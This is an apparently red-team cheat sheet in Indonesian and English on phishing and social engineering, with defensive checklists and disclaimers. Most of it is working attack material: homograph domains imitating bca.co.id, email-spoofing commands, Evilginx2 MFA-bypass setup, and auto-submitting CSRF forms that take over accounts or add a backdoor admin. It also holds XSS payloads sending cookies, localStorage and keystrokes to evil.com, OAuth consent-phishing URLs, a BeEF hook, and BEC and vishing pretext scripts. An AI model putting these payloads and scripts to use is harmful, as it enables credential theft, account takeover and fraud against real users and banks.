# 🎭 SOCIAL ENGINEERING & PHISHING — Part 11

## IDN Homograph, Email Phishing, CSRF Chains, Advanced Scam Techniques

> ⚠️ **Hanya untuk edukasi, security awareness training, dan authorized red team.**

---

## 📑 Table of Contents
1. [IDN Homograph Attacks](#1-idn-homograph-attacks)
2. [Phishing Email Techniques](#2-phishing-email-techniques)
3. [CSRF-Based Social Engineering](#3-csrf-based-social-engineering)
4. [XSS-Based Phishing](#4-xss-based-phishing)
5. [Clickjacking Attacks](#5-clickjacking-attacks)
6. [OAuth Phishing](#6-oauth-phishing)
7. [QR Code Phishing (Quishing)](#7-qr-code-phishing)
8. [Watering Hole Attacks](#8-watering-hole-attacks)
9. [Pretexting & Vishing](#9-pretexting--vishing)
10. [Detection & Prevention](#10-detection--prevention)

---

# 1. IDN Homograph Attacks

1.  Apa Itu IDN Homograph?
IDN (Internationalized Domain Name) homograph adalah teknik phishing/typosquatting di mana penyerang menggunakan karakter‑karakter Unicode yang menyamar seperti huruf Latin (misalnya Cyrillic “а” ≈ “a”, Greek “ο” ≈ “o”, …).

Domain yang tampak sama dengan domain sah (misalnya bca.co.id) dapat dibuat dengan menempatkan karakter “homoglyph” pada posisi tertentu sehingga browser menampilkan domain yang identik.
2.  Alat‑alat Online Untuk Membuat / Mengecek Domain IDN Homograph
#	Nama Alat	Link	Fitur Utama	Catatan Penggunaan
1	Homoglyph Attack Generator (Irongate)	https://www.irongeek.com/homoglyph-attack-generator.php	1. Masukkan domain “bca.co.id” 
2. Pilih karakter “homoglyph” (Cyrillic, Greek, …) 
3. Dapatkan versi Unicode dan Punycode	Sangat mudah, cocok untuk quick‑test dan demonstrasi.
2	Homoglyph Generator – Lavx.hu	https://tools.lavx.hu/tools/homoglyph-generator	1. Masukkan teks (domain, kata, kalimat) 
2. Pilih bahasa/skrip 
3. Outputkan string Unicode + Punycode	UI modern, banyak opsi skrip.
3	Homoglyphs & Homographs Generator (dCode.fr)	https://www.dcode.fr/homoglyphs-homographs-generator	1. Masukkan teks 
2. Pilih “look‑alike” karakter 
3. Outputkan hasil	Sederhana, tidak memerlukan login.
4	Punycode Converter (Unicode → IDN)	https://www.punycoder.com/	1. Masukkan domain Unicode 
2. Dapatkan Punycode dan sebaliknya	Berguna bila ingin memeriksa apakah domain sudah dipunycode.
5	Fake Text (Homoglyph) Detector & Generator – Originality.AI	https://originality.ai/blog/fake-text-homoglyph-detector-and-generator	1. Input teks domain 
2. Dapatkan deteksi & contoh homoglyph	Berguna untuk memeriksa confusability dan menguji AI.
6	Punycode/IDN Analyzer (tools.lavx.hu)	https://tools.lavx.hu/tools/punycode-analyzer	1. Input domain (Unicode / Punycode) 
2. Analisis risiko, konversi, & rekomendasi	Cocok untuk audit keamanan domain.
7	IDN Homograph Attack Checker – GitHub (offline)	https://github.com/varrickkoh/IDN-Homograph-Detector	1. Clone repo 
2. Jalankan script pada domain	Untuk penggunaan lanjutan / integrasi CI/CD.
3.  Cara Memakai Alat‑Alat Di Atas (Contoh Praktis)

Buka Alat
Contoh: https://www.irongeek.com/homoglyph-attack-generator.php

Masukkan Domain Asli
bca.co.id

Pilih Karakter Homoglyph
Misalnya pilih “Cyrillic a (U+0430)” atau “Greek alpha (U+03B1)”.

Klik “Generate”
Alat akan menampilkan:
Domain Unicode (misalnya bсa.co.id dengan с Cyrillic)
Domain Punycode (misalnya xn--bca-3ya.co.id)

Verifikasi
Gunakan alat lain (Punycode Converter atau Punycode/IDN Analyzer) untuk memastikan domain valid dan belum terdaftar.

Catat
Jika domain belum terdaftar, Anda bisa mendaftarkannya (perhatikan kebijakan registrar).


Catatan keamanan


Semua contoh di atas hanya demonstrasi.

Jangan gunakan domain ini untuk tujuan phishing atau penipuan.

Untuk audit keamanan organisasi, gunakan alat tersebut untuk memeriksa domain hijacking atau typosquatting.


4.  Mengapa bca.co.id Tampil “Real” vs “Fake”
Domain	Tampilkan “Real”?	Alasan
bca.co.id	Ya	Terdaftar di registrar Indonesia, DNS publik, sertifikat SSL resmi.
bca.co.id (dengan karakter homoglyph)	Tidak	Jika menggunakan huruf mirip (misalnya Cyrillic с), domain tidak terdaftar dan biasanya tidak akan berhasil resolve. Browser akan menampilkan Punycode (xn--bca-3ya.co.id) yang jelas berbeda.

Praktik terbaik: Selalu cek domain melalui Punycode Converter atau DNS lookup (dig, nslookup) sebelum mengeksekusi tautan.


## Konsep

```
REAL:  bca.co.id     → ASCII murni, domain sah
FAKE:  bсa.co.id     → 'c' diganti Cyrillic 'с' (U+0441)
FAKE:  bса.co.id     → 'c' dan 'a' diganti Cyrillic

Browser modern menampilkan Punycode (xn--...) untuk mixed-script domains.
Tapi: email client, mobile apps, dan chat apps mungkin TIDAK menampilkan Punycode!
```

## Homoglyph Database

```
Latin → Cyrillic (paling umum):
a → а (U+0430)    c → с (U+0441)    e → е (U+0435)
o → о (U+043E)    p → р (U+0440)    x → х (U+0445)
y → у (U+0443)    s → ѕ (U+0455)    i → і (U+0456)
k → к (U+043A)    h → һ (U+04BB)    t → т (U+0442)

Latin → Greek:
a → α (U+03B1)    e → ε (U+03B5)    i → ι (U+03B9)
o → ο (U+03BF)    v → ν (U+03BD)    k → κ (U+03BA)

Angka:
0 → О (Cyrillic O)   1 → l (lowercase L)   1 → I (uppercase i)
```

## Tools

```bash
# Python tool (included in this repo)
python tools/homograph_edu.py --domain bca.co.id
python tools/homograph_edu.py --domain google.com --mode all
python recon-cheatsheet\tools\homograph_edu.py --domain bca.co.id --target xxxxx.co.id


# Online tools
# 1. https://www.irongeek.com/homoglyph-attack-generator.php
# 2. https://www.punycoder.com/
# 3. https://tools.lavx.hu/tools/homoglyph-generator

# Check if homoglyph domain registered
dig xn--bc-8cd.co.id    # Punycode lookup
whois xn--bc-8cd.co.id  # Whois check

# DNSTwist (domain permutation scanner)
pip install dnstwist
dnstwist --registered bca.co.id
dnstwist --registered google.com
# Checks: homoglyphs, typos, bit-flips, additions, subdomains
```

---

# 2. Phishing Email Techniques

## Email Header Spoofing

```
# ===== BASIC EMAIL SPOOFING =====
# SMTP doesn't verify From: by default

# swaks (SMTP Swiss Army Knife)
swaks --to victim@target.com \
  --from "admin@target.com" \
  --header "Subject: Urgent: Password Reset Required" \
  --body "Click here to reset: http://evil.com/reset" \
  --server smtp.evil.com

# Python smtplib
import smtplib
from email.mime.text import MIMEText
msg = MIMEText("Click here to verify: http://evil.com/verify")
msg['Subject'] = 'Account Verification Required'
msg['From'] = 'security@target.com'  # SPOOFED
msg['To'] = 'victim@target.com'

# ===== CHECK EMAIL SECURITY =====
# SPF
dig TXT target.com | grep "v=spf1"
# DKIM
dig TXT default._domainkey.target.com
# DMARC
dig TXT _dmarc.target.com

# If no SPF/DKIM/DMARC → email spoofing possible!
```

## Phishing Page Techniques

```bash
# ===== CLONE WEBSITE =====
# HTTrack
httrack https://target.com/login -O /tmp/clone

# wget mirror
wget --mirror --convert-links --page-requisites https://target.com/login

# GoPhish (phishing framework)
# 1. Setup GoPhish server
# 2. Create landing page (clone or custom)
# 3. Create email template
# 4. Create sending profile (SMTP)
# 5. Launch campaign
# 6. Track: opens, clicks, submitted credentials

# SET (Social Engineering Toolkit)
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 4) Site Cloner
# Enter URL: https://target.com/login

# Evilginx2 (reverse proxy phishing — bypasses MFA!)
evilginx2
: phishlets hostname target.com evil.com
: phishlets enable target
: lures create target
# Victim logs in through proxy → session cookie captured
```

## Email Payload Types

```
# ===== ATTACHMENT-BASED =====
# 1. Macro-enabled Office docs (.docm, .xlsm)
# 2. PDF with embedded JavaScript
# 3. HTML attachment with credential form
# 4. ISO/IMG files (bypass Mark-of-the-Web)
# 5. LNK shortcut files → PowerShell
# 6. OneNote with embedded scripts (.one)
# 7. ZIP with password (bypasses scanning)

# ===== LINK-BASED =====
# 1. Credential harvesting page
# 2. Drive-by download
# 3. OAuth consent phishing
# 4. QR code in email body
# 5. Open redirect chain: trusted.com → evil.com
# 6. Data URI: data:text/html;base64,PHNjcmlwdD5...

# ===== HEADER TRICKS =====
# Reply-To different from From
From: ceo@company.com
Reply-To: ceo@evil.com

# Display name spoofing
From: "IT Security <security@company.com>" <random@evil.com>
# Some clients show only display name!
```

---

# 3. CSRF-Based Social Engineering

```html
<!-- ===== SCENARIO: Force victim to change their email ===== -->
<!-- Attacker sends link/embeds in page victim visits -->

<!-- Auto-submit: victim visits page → account email changed -->
<html>
<body onload="document.getElementById('f').submit()">
<form id="f" action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
</body>
</html>

<!-- ===== SCENARIO: Force password change ===== -->
<form id="f" action="https://target.com/api/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.getElementById('f').submit()</script>

<!-- ===== SCENARIO: Transfer money ===== -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- ===== SCENARIO: Add admin user ===== -->
<form id="f" action="https://target.com/admin/add-user" method="POST">
  <input type="hidden" name="username" value="backdoor">
  <input type="hidden" name="password" value="P@ssw0rd">
  <input type="hidden" name="role" value="admin">
</form>
<script>document.getElementById('f').submit()</script>

<!-- ===== DELIVERY: Embed in email ===== -->
<!-- Send HTML email with hidden form -->
<!-- Or send link: https://evil.com/page-with-csrf -->
```

---

# 4. XSS-Based Phishing

```html
<!-- ===== REFLECTED XSS → Fake Login ===== -->
<!-- If target has XSS: https://target.com/search?q=<script>...</script> -->

<script>
// Replace page with fake login
document.body.innerHTML = `
<div style="max-width:400px;margin:100px auto;font-family:Arial">
  <h2>Session Expired</h2>
  <p>Please log in again to continue.</p>
  <form action="https://evil.com/capture" method="POST">
    <input name="username" placeholder="Username" style="width:100%;padding:10px;margin:5px 0"><br>
    <input name="password" type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0"><br>
    <button style="width:100%;padding:10px;background:#0066cc;color:white;border:none;cursor:pointer">Log In</button>
  </form>
</div>`;
</script>

<!-- ===== STORED XSS → Keylogger ===== -->
<script>
document.onkeypress = function(e) {
  new Image().src = "https://evil.com/log?k=" + e.key;
};
</script>

<!-- ===== XSS → Cookie Steal ===== -->
<script>
new Image().src="https://evil.com/steal?c="+document.cookie;
</script>

<!-- ===== XSS → Session Hijacking ===== -->
<script>
fetch("https://evil.com/steal", {
  method: "POST",
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    url: location.href
  })
});
</script>
```

---

# 5. Clickjacking Attacks

```html
<!-- ===== BASIC CLICKJACKING ===== -->
<!-- Invisible iframe over visible button -->
<style>
  iframe {
    position: absolute; top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0;            /* Invisible */
    z-index: 10;           /* On top */
  }
  .bait {
    position: absolute; top: 300px; left: 200px;
    font-size: 24px; cursor: pointer;
  }
</style>

<!-- Target page loaded in invisible iframe -->
<iframe src="https://target.com/settings/delete-account"></iframe>
<!-- Visible bait button aligned over iframe's real button -->
<div class="bait">🎁 Click here to claim your prize!</div>

<!-- ===== LIKEJACKING (Facebook like) ===== -->
<iframe src="https://facebook.com/plugins/like.php?href=ATTACKER_PAGE"
  style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%">
</iframe>
<button>Play Video</button>

<!-- ===== DETECTION =====  -->
<!-- Check if target allows framing: -->
curl -sI https://target.com | grep -i "x-frame-options\|content-security-policy"
# X-Frame-Options: DENY → Protected
# X-Frame-Options: SAMEORIGIN → Protected (same origin only)
# No header → VULNERABLE to clickjacking
```

---

# 6. OAuth Phishing

```bash
# ===== CONSENT PHISHING =====
# Attacker creates malicious OAuth app
# Sends link: "Authorize this app to access your account"
# Victim clicks "Allow" → attacker gets OAuth token

# Attack flow:
# 1. Register OAuth app on platform (Google, Microsoft, GitHub)
# 2. Request excessive permissions (read email, contacts, files)
# 3. Send authorization link to victim
# 4. Victim authorizes → attacker gets access token
# 5. Access victim's data via API

# Example malicious OAuth URL:
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=ATTACKER_APP_ID&
  redirect_uri=https://evil.com/callback&
  response_type=code&
  scope=https://www.googleapis.com/auth/gmail.readonly
  https://www.googleapis.com/auth/contacts.readonly&
  access_type=offline

# ===== REDIRECT_URI MANIPULATION =====
# If redirect_uri not strictly validated:
redirect_uri=https://evil.com/callback
redirect_uri=https://target.com@evil.com
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com/../evil.com
redirect_uri=https://target.com%0d%0aLocation:%20https://evil.com
```

---

# 7. QR Code Phishing (Quishing)

```bash
# ===== QR PHISHING TECHNIQUES =====
# 1. QR code in email (bypasses URL scanners!)
# 2. QR code sticker over legitimate QR
# 3. QR code in physical flyer/poster
# 4. QR code in PDF attachment

# Generate QR code
pip install qrcode
python3 -c "
import qrcode
# QR pointing to phishing page
qr = qrcode.make('https://evil.com/phishing-page')
qr.save('phishing_qr.png')
"

# QR code → WiFi credential harvester
# Fake "Free WiFi" QR → captive portal → credential form

# Detection:
# - Always preview QR destination before visiting
# - Use QR scanner that shows URL before opening
# - Check for QR stickers overlaying legitimate ones
```

---

# 8. Watering Hole Attacks

```bash
# ===== CONCEPT =====
# Compromise a website that the target frequently visits
# Inject exploit/redirect into that site

# Steps:
# 1. Identify target's browsing habits (recon)
# 2. Find vulnerability in frequently visited site
# 3. Inject malicious payload (XSS, redirect, drive-by)
# 4. Wait for target to visit → compromised

# Example: Inject into forum/blog target reads
# XSS in comment → BeEF hook
<script src="https://evil.com/hook.js"></script>

# BeEF (Browser Exploitation Framework)
# 1. Start BeEF server
# 2. Hook browser via XSS
# 3. Control victim's browser:
#    - Steal cookies
#    - Keylogging
#    - Take screenshots
#    - Redirect to phishing
#    - Exploit browser plugins
```

---

# 9. Pretexting & Vishing

```
# ===== PRETEXTING SCENARIOS =====

# IT Support:
# "Hi, this is IT. We detected suspicious activity on your account.
#  I need to verify your identity. Can you confirm your password?"

# CEO Fraud (BEC):
# Email from CEO → CFO: "Wire $50K to this account immediately.
#  This is confidential, don't tell anyone."

# Vendor Impersonation:
# "Our bank details have changed. Please update your records
#  and send next payment to: [ATTACKER_ACCOUNT]"

# ===== VISHING (Voice Phishing) =====
# Caller ID spoofing → appear as legitimate number
# Tools: SpoofCard, SpoofTel
# Script: pretend to be bank, IRS, tech support

# ===== SMISHING (SMS Phishing) =====
# "BCA: Transaksi Rp 5.000.000 terdeteksi.
#  Jika bukan Anda, klik: http://bca-verify.evil.com"

# ===== COMMON PRETEXTS =====
# 1. Password expired, reset now
# 2. Account locked, verify identity
# 3. Package delivery failed, update address
# 4. Tax refund available, claim now
# 5. Invoice attached, please review
# 6. Your device is infected, install this fix
# 7. Free WiFi — just log in with your email
```

---

# 10. Detection & Prevention

```bash
# ===== EMAIL SECURITY CHECK =====
# Check SPF
dig TXT target.com | grep spf
# Check DKIM
dig TXT default._domainkey.target.com
# Check DMARC
dig TXT _dmarc.target.com

# ===== DOMAIN MONITORING =====
# DNSTwist (detect typosquatting)
dnstwist --registered --format json target.com > domain_monitor.json

# PhishTank (check known phishing)
# https://www.phishtank.com/

# ===== BROWSER HEADERS (prevent framing) =====
# X-Frame-Options: DENY
# Content-Security-Policy: frame-ancestors 'none'

# ===== ANTI-PHISHING TOOLS =====
# GoPhish (test your own users)
# King Phisher
# Lucy (commercial)
# Cofense (commercial)

# ===== CHECKLIST: Email Phishing Indicators =====
# [ ] Sender address matches display name?
# [ ] Links point to legitimate domain?
# [ ] Urgency/fear language?
# [ ] Generic greeting ("Dear Customer")?
# [ ] Spelling/grammar errors?
# [ ] Unexpected attachment?
# [ ] Request for credentials/payment?
# [ ] Reply-To different from From?
```

---

# 11. Advanced Phishing Taxonomy (2024-2025)

| # | Technique | Typical Lure | Real-World Stats |
|---|-----------|-------------|-----------------|
| 1 | **Spear-phishing + AI** | "Hi [Name], reviewing your LinkedIn project..." | 68% spear-phish uses AI text (APWG 2024) |
| 2 | **Pharming (DNS hijack)** | Fake bank login via hijacked DNS | ISP DNS hijack → fake Google login |
| 3 | **Vishing (voice)** | "Account flagged, call back to verify" | 12% victims via voice (FBI) |
| 4 | **Smishing (SMS)** | "Package delayed, click to track" | 15% alerts via SMS (CISA 2024) |
| 5 | **OTT Messaging** | WhatsApp/Telegram QR + malicious link | 23% attacks target WhatsApp |
| 6 | **Deep-fake video/voice** | CEO voice: "I need your login" | Deep-fake CEO tricked employees |
| 7 | **QR-code phishing** | "Scan for free gift card" | QR-phishing +42% Q3 2024 |
| 8 | **Supply-chain phishing** | "Urgent vendor onboarding form" | SaaS vendor compromise 2024 |
| 9 | **Ransomware-phish** | "Install new compliance patch" | 27% ransomware via phishing |
| 10 | **Social-media DM** | "Check my new reel, download filter!" | 18% referenced TikTok/Instagram |
| 11 | **Login-to-verify** | "Login to confirm your 2FA code" | 31% used fake login pages |
| 12 | **Cloud storage links** | "Review attached invoice (Drive link)" | Cloud-phishing +35% YoY |
| 13 | **File-less phishing** | "Macro needed to calculate your tax" | 21% used file-less payloads |
| 14 | **Bot accounts (OTT)** | "Account compromised, click to secure" | Bot phishing +48% on Telegram |
| 15 | **Forgot Password** | "Reset your bank password" | 25% lured by password-reset |

---

# 12. "Fun & Creative" Phishing Techniques

| # | Technique | Hook Example | Why It Works |
|---|-----------|-------------|-------------|
| 1 | **Meme-phishing** | "NEW NFT COLLECTION! See the meme" | Humor lowers guard |
| 2 | **Pop-culture** | "'I'll be back' – Get 3-month Netflix promo" | Shared fandom = trust |
| 3 | **"It's a Joke"** | "The best joke ever – click to see!" | Curiosity + low risk perception |
| 4 | **Gamified** | "Play 'Guess the Password' – win gift card" | Reward mechanism |
| 5 | **"I'm Your Friend"** | "Just wanted to share this cat video..." | Social proof |
| 6 | **Social-DM style** | "DM me the TikTok challenge link" | Familiar chat format |
| 7 | **Fake Survey** | "Quick survey – enter email to win $100" | Survey = routine |
| 8 | **Weird Tech Support** | "Your computer is haunted! Quick scan." | Help tone + urgency |
| 9 | **Birthday Surprise** | "Happy Birthday! Claim your $50 card" | Personalization + gift |
| 10 | **Crypto-Faucet** | "Free 0.01 BTC – verify your wallet" | Money + novelty |

### Psychological Leverage

```
Technique         →  Leverage              →  Why It Works
─────────────────────────────────────────────────────────────
Meme-phishing     →  Familiar humor        →  Visual triggers instant trust
Pop-culture       →  Shared fandom         →  "We're the same tribe"
"It's a joke"     →  Curiosity             →  Low perceived risk
Gamified          →  Reward (points/prizes) →  Instant gratification
"I'm your friend" →  Social proof          →  "From friend = safe"
Social-DM         →  Familiar chat format  →  Looks like casual message
Fake survey       →  Routine action        →  "Surveys are normal"
Weird tech support→  Help + urgency        →  "I need help NOW"
Birthday          →  Personalization       →  "Free gift for ME"
Crypto-faucet     →  Money + novelty       →  "Free crypto = irresistible"
```

---

# 13. Detection & Red Flags

| Threat | Red Flag | Quick Defense |
|--------|----------|--------------|
| Spear-phish AI | Over-personalized, subtle grammar quirks | Run through GPT-detector |
| Pharming | No HTTPS, IP mismatch | `nslookup domain` → compare known IP |
| Vishing | Caller ID mismatch, urgency | Call back via official number |
| Smishing | Short generic link, no sender domain | Copy link → DNS checker |
| Deep-fake | Voice/video glitches | Use deep-fake detectors (Deepware) |
| QR-code | QR → non-HTTPS domain | Preview URL before opening |
| Supply-chain | Known vendor but new domain | Verify against official website |
| Ransomware | "Security update" attachment | Check hash on VirusTotal |
| Social-media | DM from unknown account | Verify sender profile |
| File-less | Macro prompt on open | Disable macros; sandbox first |
| Meme-phish | Link shortener, unfamiliar domain | Hover link; use URL expander |
| Gamified | Requires login/password | Use sandbox; never enter real creds |
| Birthday | "Birthday" subject, no prior interaction | Check email authenticity |
| Crypto | "Free coins" promise | Never share wallet; use legit faucets |

---

# 14. Phishing Frameworks & Tools

```bash
# ===== GOPHISH (Phishing Campaign Framework) =====
# Download: https://getgophish.com/
# 1. Setup SMTP sending profile
# 2. Create email template (clone real email)
# 3. Create landing page (clone login page)
# 4. Import targets (CSV: name, email)
# 5. Launch campaign
# 6. Track: opens, clicks, submitted credentials
# Dashboard shows real-time statistics

# ===== SOCIAL ENGINEERING TOOLKIT (SET) =====
git clone https://github.com/trustedsec/social-engineer-toolkit.git
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester
# 4) Site Cloner → enter target URL

# ===== EVILGINX2 (Reverse Proxy — Bypasses MFA!) =====
# Real-time MITM phishing proxy
# Captures session cookies AFTER MFA
evilginx2
: phishlets hostname target.com evil.com
: phishlets enable target
: lures create target
# Victim authenticates through proxy → session token stolen

# ===== KING PHISHER =====
# https://github.com/securestate/king-phisher
# Full phishing campaign framework with tracking

# ===== BEEF (Browser Exploitation Framework) =====
# Hook browser via XSS → full browser control
# Keylogging, screenshot, redirect, credential harvest
beef-xss
# Hook URL: <script src="http://attacker:3000/hook.js"></script>
```

---

# 15. Complete Mitigation Checklist

```
[ ] Email filtering & sandboxing (block known phishing URLs)
[ ] DMARC + SPF + DKIM configured on all domains
[ ] Monthly phishing simulation campaigns (GoPhish)
[ ] Two-factor authentication (TOTP/WebAuthn, NOT SMS)
[ ] DNS filtering (block malicious domains)
[ ] Zero-trust policies (verify before granting access)
[ ] Security awareness training (quarterly)
[ ] Homoglyph domain monitoring (dnstwist)
[ ] Browser settings: show Punycode for IDN domains
[ ] Disable macros by default in Office
[ ] Sandbox all email attachments
[ ] URL preview before click (hover check)
[ ] Report phishing button in email client
[ ] Incident response plan for phishing
[ ] SSL certificate monitoring for your domains
```

---

Whats next ? https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Linux%20-%20Privilege%20Escalation.md

> ⚠️ **DISCLAIMER**: Semua teknik hanya untuk **security awareness training**, **authorized red team**, dan **edukasi**. Penggunaan untuk penipuan/phishing merupakan tindak pidana.
